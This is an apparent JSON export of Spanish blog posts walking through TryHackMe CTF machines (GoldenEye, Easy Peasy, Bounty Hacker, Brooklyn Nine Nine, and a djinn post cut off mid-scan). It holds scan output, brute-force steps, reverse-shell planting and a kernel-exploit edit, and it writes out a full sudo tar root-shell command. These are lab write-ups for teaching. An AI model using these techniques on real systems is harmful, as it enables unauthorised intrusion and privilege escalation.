[{"content":"Easy Peasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo GoldenEye     Info Bond, James Bond. A guided CTF.   Puntos 420   Dificultad Media   Maker ben    GOLDENEYE PART 1 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80). ssl (55006), pop3 (55007) y el puerto smtp (25) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # Nmap 7.80 scan initiated Wed Aug 5 17:03:08 2020 as: nmap -sV -o mini_scan golden.thm Nmap scan report for golden.thm (10.10.38.197) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 17:03:58 2020 -- 1 IP address (1 host up) scanned in 50.07 seconds # Nmap 7.80 scan initiated Wed Aug 5 17:02:54 2020 as: nmap -sV -p- -T5 -o big_scan golden.thm Warning: 10.10.38.197 giving up on port because retransmission cap hit (2). Nmap scan report for golden.thm (10.10.38.197) Host is up (0.25s latency). Not shown: 65449 closed ports, 82 filtered ports PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 55006/tcp open ssl/unknown 55007/tcp open pop3 Dovecot pop3d Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 17:16:03 2020 -- 1 IP address (1 host up) scanned in 789.07 seconds   HTTP Encontramos una pagina web en el puerto 80, en donde mencionan un directorio /sev-home/.\nEn el codigo del script que se ejecuta en la pagina encontramos un posible nombre de usuario y contraseña, en el comentario tambien indica que la contraseña esta codificada.\nUtilizamos CyberChef para obtener en texto plano la contraseña.\nEn el directorio /sev-home/ encontramos un panel simple de logeo.\nAl ingresar con las credenciales que encontramos nos muestra un video con contenido en la pagina.\nEn uno de los parrafos muestra el siguiente mensaje, en el que indican que devemos de enviar un correo a un supervisor calificado, y que el servicio de pop3 esta configurado en un puerto alto que seria el 55007:\n1 2 3 4 5 6 7  Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port   Además en el codigo fuente de la pagina encontramos otro posible nombre de usuario junto a otro que ya encontramos y que son \u0026ldquo;supervisores\u0026rdquo;.\nRUSTBUSTER/GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el directorio principal (/).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-08-05 17:13:55 GET\t200 OK\thttp://golden.thm/ GET 403 Forbidden http://golden.thm/.php GET 403 Forbidden http://golden.thm/.html GET 403 Forbidden http://golden.thm/.hta GET 403 Forbidden http://golden.thm/.hta.php GET 403 Forbidden http://golden.thm/.hta.html GET 403 Forbidden http://golden.thm/.hta.txt GET 403 Forbidden http://golden.thm/.htaccess GET 403 Forbidden http://golden.thm/.htaccess.php GET 403 Forbidden http://golden.thm/.htaccess.html GET 403 Forbidden http://golden.thm/.htaccess.txt GET 403 Forbidden http://golden.thm/.htpasswd GET 403 Forbidden http://golden.thm/.htpasswd.php GET 403 Forbidden http://golden.thm/.htpasswd.html GET 403 Forbidden http://golden.thm/.htpasswd.txt GET 200 OK http://golden.thm/index.html GET 200 OK http://golden.thm/index.html GET 403 Forbidden http://golden.thm/server-status [00:03:25] ######################################## 18444/18444 ETA: 00:00:00 req/s: 89 [?] Ended at: 2020-08-05 17:17:20   Utilizando GOBUSTER con las credenciales realizamos una busqueda de paginas y directorios en /sev-home/ pero no encontramos nada interesante.\nroot@upset:~/thm/goldeneye# gobuster dir -u http://golden.thm/sev-home/ -w /usr/share/wordlists/dirb/common.txt -P [... REDACTED ...] -U boris -q -t 50 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) POP3 - HYDRA Intentamos reutilizar la contraseña junto con los usuarios que encontramos en este servicio pero no funcionaron, por lo que utilizamos hydra para hacer un ataque de fuerza bruta junto con los usuarios y el wordlist rockyou.\nDespues de realizar mas de diez mil intentos no encontramos alguna contraseña (raro en una maquina de THM) con el wordlist rockyou cambiamos de wordlist a uno más pequeño, con el cual encontramos credenciales para los usuarios boris y natalya.\nBORIS - EMAIL Utilizamos las credenciales para leer los correos de boris al igual que en Fowsniff CTF - THM, encontramos otros usuarios xenia y alec. En los correos hablan sobre codigos de boris, estos codigos natalya ha podido romper. Tambien sobre un archivo escondido en el servidor.\ncorreo1 correo2 correo3  1 2 3 4 5 6 7 8 9 10 11 12 13 14  RETR 1 +OK 544 octets Return-Path: \u0026lt;root@127.0.0.1.goldeneye\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id D9E47454B1 for \u0026lt;boris\u0026gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT) Message-Id: \u0026lt;20180425022326.D9E47454B1@ubuntu\u0026gt; Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT) From: root@127.0.0.1.goldeneye Boris, this is admin. You can electronically communicate to co-workers and students here. I\u0026#39;m not going to scan emails for security risks because I trust you and the other admins here. .     1 2 3 4 5 6 7 8 9 10 11 12 13 14  RETR 2 +OK 373 octets Return-Path: \u0026lt;natalya@ubuntu\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id C3F2B454B1 for \u0026lt;boris\u0026gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT) Message-Id: \u0026lt;20180425024249.C3F2B454B1@ubuntu\u0026gt; Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT) From: natalya@ubuntu Boris, I can break your codes! .     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  RETR 3 +OK 921 octets Return-Path: \u0026lt;alec@janus.boss\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from janus (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id 4B9F4454B1 for \u0026lt;boris\u0026gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT) Message-Id: \u0026lt;20180425025235.4B9F4454B1@ubuntu\u0026gt; Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT) From: alec@janus.boss Boris, Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn! Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages.... PS - Keep security tight or we will be compromised. .       'use strict'; var containerId = JSON.parse(\"\\\"5eef4290c6bb646f\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  NATALYA - EMAIL Utilizamos neuvamente telnet pero esta vez con las credenciales de natalya, encontramos en uno de los correos las credenciales del usuario xenia.\ncorreo1 correo2  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  RETR 1 +OK 631 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id D5EDA454B1 for \u0026lt;natalya\u0026gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT) Message-Id: \u0026lt;20180425024542.D5EDA454B1@ubuntu\u0026gt; Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT) From: root@ubuntu Natalya, please you need to stop breaking boris\u0026#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you. Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus. .     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  RETR 2 +OK 1048 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from root (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 17C96454B1 for \u0026lt;natalya\u0026gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT) Message-Id: \u0026lt;20180425031956.17C96454B1@ubuntu\u0026gt; Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT) From: root@ubuntu Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it\u0026#39;s related to security...even if it\u0026#39;s not, just enter it in under the guise of \u0026#34;security\u0026#34;...it\u0026#39;ll get the change order escalated without much hassle :) Ok, user creds are: username: xenia password: [... REDACTED ...] Boris verified her as a valid contractor so just create the account ok? And if you didn\u0026#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir **Make sure to edit your host file since you usually work remote off-network.... Since you\u0026#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts. .       'use strict'; var containerId = JSON.parse(\"\\\"ddf4a8c14cc81176\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  GOLDENEYE PART 2 Agregamos el siguiente dominio severnaya-station.com a nuestro archiv /etc/hosts junto a la IP de la maquina, y nos dirigimos a /gnocertdir. Encontramos lo que parece ser la plataforma Moodle.\nUtilizamos las credenciales de xenia para ingresar. En los mensajes de xenia encontramos un mensaje de doak (nuevo nombre de usuario) en donde habla sobre un curso en el que xenia esta involucrada.\nDOAK - HYDRA -\u0026gt; POP3 Nuevamente utilizamos hydra con el usuario doak en el puerto de pop3 (55007). Logramos obtener su contraseña.\nAl revisar uno de sus correos encontramos su usario y contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  RETR 1 +OK 606 octets Return-Path: \u0026lt;doak@ubuntu\u0026gt; X-Original-To: doak Delivered-To: doak@ubuntu Received: from doak (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 97DC24549D for \u0026lt;doak\u0026gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT) Message-Id: \u0026lt;20180425034731.97DC24549D@ubuntu\u0026gt; Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT) From: doak@ubuntu James, If you\u0026#39;re reading this, congrats you\u0026#39;ve gotten this far. You know how tradecraft works right? Because I don\u0026#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information...... username: dr_doak password: [... REDACTED ...] .   ADMIN - MOODLE Utilizamos las credenciales de doak en moodle. Encontramos un archivo que contiene una direccion a una imagen, que segun el mensaje ahi se encuentran las credenciales del usuario admin.\nDescargamos la imagen y al analizarla con exiftool encontramos una cadena de texto codificada en base64.\nUtilizamos la \u0026ldquo;contraseña\u0026rdquo; que encontramos en moodle con el usuario admin y logramos obtener acceso.\nWWW-DATA - USER Dentro de moodle agregamos una shell inversa en la configuracion del PATH de ASPELL.\nTambien configuramos el parametro del plugin TinyMCE a PSpellShell.\nPusimos a la escucha netcat, creamos una nueva entrada de blog donde vemos la opcion de spell, que al presionar el boton, se ejecuta nuestra shell.\nLogramos obtener una shell con el usuario www-data.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con uname -a y vemos la version del kernel, al revisar si existe un exploit encontramos Linux Kernel 3.13.0 - Local Privilege Escalation, el cual descargamos y ejecutamos en la maquina, pero nos dio un error y es que gcc no está instalado en la maquina.\nPor lo que buscamos alternativas a gcc y encontramos clang, el cual si esta instalado en la maquina. Editamos el exploit cambiando gcc por clang, descargamos, ejecutamos el exploit en la maquina y logramos obtener una shell con usuario root.\ngcc a lang.\n1 2  -lib = system(\u0026#34;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\u0026#34;); +lib = system(\u0026#34;clang -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\u0026#34;);   Y nuestra flag root.txt.\n","description":"","id":0,"section":"posts","tags":["linux"],"title":"TryHackMe - GoldenEye","uri":"https://sckull.github.io/posts/goldeneye/"},{"content":"Easy Peasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Easy Peasy     Info Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.   Puntos 330   Dificultad Facil   Maker kral4    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ssh (6498) y http (65524) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # Nmap 7.80 scan initiated Wed Aug 5 01:17:20 2020 as: nmap -p- -T4 -o nmap_scan -v easy.thm Increasing send delay for 10.10.162.162 from 0 to 5 due to 21 out of 52 dropped probes since last increase. Nmap scan report for easy.thm (10.10.162.162) Host is up (0.26s latency). Not shown: 65532 closed ports PORT STATE SERVICE 80/tcp open http 6498/tcp open unknown 65524/tcp open unknown Read data files from: /usr/bin/../share/nmap # Nmap done at Wed Aug 5 01:39:35 2020 -- 1 IP address (1 host up) scanned in 1335.29 seconds # Nmap 7.80 scan initiated Wed Aug 5 01:46:14 2020 as: nmap -sV -p 80,6498,65524 -o services_scan easy.thm Nmap scan report for easy.thm (10.10.162.162) Host is up (0.29s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.16.1 6498/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 65524/tcp open http Apache httpd 2.4.43 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 01:46:30 2020 -- 1 IP address (1 host up) scanned in 15.45 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4  root@upset:~/thm/easypeasy gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://easy.thm/ -q -t 250 -x php,html,txt /index.html (Status: 200) /robots.txt (Status: 200) /hidden (Status: 301)   Encontramos el archivo robots.txt el cual no contiene ninguna url excluida, tambien la pagina hidden donde encontramos una imagen de fondo.\nEjecutamos nuevamente RUSTUBUSTER pero ahora en el directorio/pagina hidden.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://easy.thm/hidden/ -t 155 -e php,html,txt -o out_hidden.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-08-05 00:52:23 GET\t200 OK\thttp://easy.thm/hidden/ GET 200 OK http://easy.thm/hidden/index.html GET 301 Moved Permanently http://easy.thm/hidden/whatever =\u0026gt; http://easy.thm/hidden/whatever/ GET 200 OK http://easy.thm/hidden/ ^C   En una de las paginas encontradas vemos base64, el cual contiene una flag.\nHTTP 65524 Encontramos la pagina de apache en el puerto 65524.\nEncontramos en el codigo fuente una flag.\nAdemás un parrafo escondido, con una cadena de caracteres \u0026ldquo;codificado\u0026rdquo;.\nEjecutamos rustbuster en este puerto al igual que en el puerto 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -u http://easy.thm:65524/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 -e php,html,txt -o high_port.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-08-05 01:14:24 GET\t200 OK\thttp://easy.thm:65524/ GET 403 Forbidden http://easy.thm:65524/.html GET 200 OK http://easy.thm:65524/index.html GET 200 OK http://easy.thm:65524/robots.txt C^   En robots.txt encontramos un hash MD5, utilizamos md5hashing para obtener el texto plano el cual es una flag.\nRustbuster no nos dio mas que errores, por lo que nos concentramos en el texto \u0026ldquo;codificado\u0026rdquo; que encontramos. Utilizamos CyberChef para poder decodificar el texto. Encontramos que es posiblo utilizando base62, el cual nos devolvio lo que parece ser un directorio.\nEncontramos en este nuevo directorio lo que parece ser un hash SHA-256.\nUtilizamos nuevamente md5hashing el cual nos mostró una \u0026ldquo;contraseña\u0026rdquo;.\nDescargamos la imagen de la pagina, utilizando steghide y la contraseña que encontramos logramos encontrar un archivo que contiene codificado en binario un texto y el nombre de un usuario.\nNuevamente con CyberChef logramos obtener el texto.\nBORING - USER Con las credenciales que encontramos ingresamos por medio del servicio SSH de la maquina en el puerto 6498.\nEncontramos nuestra flag user.txt la cual esta \u0026lsquo;rotada\u0026rsquo;.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con cat /etc/crontab y vemos cron que se ejecuta con el usuario root y que ejecuta el archivo .mysecretcronjob.sh en /var/www/.\nEl archivo no contiene ningun comando por lo que agregamos una shell inversa al archivo.\nEjecutamos netcat para esperar la conexion de nuestra shell, obtuvimos una shell con usuario root y nuestra flag root.txt.\n","description":"","id":1,"section":"posts","tags":["linux"],"title":"TryHackMe - Easy Peasy","uri":"https://sckull.github.io/posts/easypeasy/"},{"content":"Bounty Hacker es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Bounty Hacker     Info You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!   Puntos 150   Dificultad Facil   Maker Sevuhl    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Sat Aug 1 10:19:44 2020 as: nmap -sV -o nmap_scan_mini bountyhacker.thm Nmap scan report for bountyhacker.thm (10.10.131.158) Host is up (0.28s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 10:20:09 2020 -- 1 IP address (1 host up) scanned in 24.80 seconds   FTP En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos dos archivos, uno que contiene lo que parece ser un wordlist, el segundo dos \u0026ldquo;tareas\u0026rdquo; y un posible nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  root@upset:~/thm/bountyhacker# ftp bountyhacker.thm Connected to bountyhacker.thm. 220 (vsFTPd 3.0.3) Name (bountyhacker.thm:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 21:41 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 21:47 task.txt 226 Directory send OK. ftp\u0026gt; get locks.txt local: locks.txt remote: locks.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 226 Transfer complete. 418 bytes received in 0.04 secs (10.7433 kB/s) ftp\u0026gt; get task.txt local: task.txt remote: task.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 226 Transfer complete. 68 bytes received in 0.00 secs (295.1389 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/bountyhacker# cat locks.txt rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 [... REDACTED ...] REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N ReDSynd1ca7e root@upset:~/thm/bountyhacker# cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin root@upset:~/thm/bountyhacker#   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.\n1 2 3 4 5  root@upset:~/thm/bountyhacker# gobuster dir -u http://bountyhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   LIN - USER Utilizamos el usuario y el \u0026ldquo;wordlist\u0026rdquo; que encontramos en el puerto 21 con Hydra en el puerto 22 de SSH, donde logramos encontrar la contraseña para este usuario.\nLogramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando tar. Utilizamos tar para obtener una shell root.\n1  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   Obtuvimos una shell con usuario root y nuestra flag root.txt.\n","description":"","id":2,"section":"posts","tags":["linux"],"title":"TryHackMe - Bounty Hacker","uri":"https://sckull.github.io/posts/bountyhacker/"},{"content":"Brooklyn Nine Nine es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Brooklyn Nine Nine     Info This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.   Puntos 110   Dificultad Facil   Maker Fsociety2006    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Wed Jul 29 16:46:49 2020 as: nmap -sV -o nmap_scan_mini brooklyn.thm Nmap scan report for brooklyn.thm (10.10.125.15) Host is up (0.31s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 16:47:33 2020 -- 1 IP address (1 host up) scanned in 43.91 seconds   FTP Ingresamos en el servicio FTP con las credenciales de anonymous (anonymous:anonymous) donde encontramos una nota, además dos posibles nombres de usuario Amy y Jake.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  root@upset:~/thm/brooklyn# ftp brooklyn.thm Connected to brooklyn.thm. 220 (vsFTPd 3.0.3) Name (brooklyn.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 119 May 17 23:17 note_to_jake.txt 226 Directory send OK. ftp\u0026gt; get note_to_jake.txt local: note_to_jake.txt remote: note_to_jake.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes). 226 Transfer complete. 119 bytes received in 0.01 secs (12.3510 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/brooklyn# cat note_to_jake.txt From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine root@upset:~/thm/brooklyn#   HTTP Encontramos una pagina web en el puerto 80.\nEn el codigo fuente de la pagina encontramos un comentario que habla sobre esteganografia.\n1 2  \u0026lt;p\u0026gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.\u0026lt;/p\u0026gt; \u0026lt;!-- Have you ever heard of steganography? --\u0026gt;   Utilizamos STEGCRACKER para hacer un ataque de contraseñas a la imagen. Encontramos la contraseña y un archivo que contiene una contraseña, además un posible usuario Holt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@upset:~/thm/brooklyn# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker) Copyright (c) 2020 - Luke Paris (Paradoxis) Counting lines in wordlist.. Attacking file \u0026#39;brooklyn99.jpg\u0026#39; with wordlist \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;.. Successfully cracked file with password: admin Tried 20587 passwords Your file has been written to: brooklyn99.jpg.out admin root@upset:~/thm/brooklyn# cat brooklyn99.jpg.out Holts Password: fluf[... REDACTED ...]nenine Enjoy!! root@upset:~/thm/brooklyn#   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2  root@upset:~/thm/brooklyn# gobuster dir -u http://brooklyn.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 200)   HOLT - USER Utilizamos la contraseña con los usuarios que encontramos y logramos obtener una shell con el usuario holt, y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando nano. Utilizamos env para obtener una shell root.\nUtilizamos GFOBINS - NANO para obtener una shell con el usuario root y nuestra flag root.txt.\n","description":"","id":3,"section":"posts","tags":["linux"],"title":"TryHackMe - Brooklyn Nine Nine","uri":"https://sckull.github.io/posts/brooklyn99/"},{"content":"djinn es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo djinn     Info Intermediate level vulnerable box.   Puntos 60   Dificultad Medio   Maker falconfeast    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  # Nmap 7.80 scan initiated Sat Aug 1 11:03:49 2020 as: nmap -sV -o nmap_scan_mini djinn.thm Nmap scan report for djinn.thm (10.10.181.33) Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp filtered ssh Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 11:03:57 2020 -- 1 IP address (1 host up) scanned in 7.89 seconds # Nmap 7.80 scan initiated Sat Aug 1 11:03:02 2020 as: nmap -sV -p- -T5 -o nmap_scan djinn.thm Warning: 10.10.181.33 giving up on port because retransmission cap hit (2). Nmap scan report for djinn.thm (10.10.181.33) Host is up (0.25s latency). Not shown: 65115 closed ports, 417 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 1337/tcp open waste? 7331/tcp open http Werkzeug httpd 0.16.0 (Python 2.7.15+) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.80%I=7%D=8/1%Time=5F2594CD%P=x86_64-pc-linux-gnu%r(NUL SF:L,1BC,\u0026#34;\\x20\\x20____\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_____\\x20_\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20/\\x20___\\|\\x20__\\x SF:20_\\x20_\\x20__\\x20___\\x20\\x20\\x20___\\x20\\x20\\|_\\x20\\x20\\x20_\\(_\\)_\\x20_ SF:_\\x20___\\x20\\x20\\x20___\\x20\\n\\|\\x20\\|\\x20\\x20_\\x20/\\x20_`\\x20\\|\\x20\u0026#39;_\\x SF:20`\\x20_\\x20\\\\\\x20/\\x20_\\x20\\\\\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\u0026#39;_\\x2 SF:0`\\x20_\\x20\\\\\\x20/\\x20_\\x20\\\\\\n\\|\\x20\\|_\\|\\x20\\|\\x20\\(_\\|\\x20\\|\\x20\\|\\x SF:20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\x20__/\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\| SF:\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\x20__/\\n\\x20\\\\____\\|\\\\__,_\\|_\\|\\x20\\|_\\|\\x SF:20\\|_\\|\\\\___\\|\\x20\\x20\\x20\\|_\\|\\x20\\|_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\___\\|\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 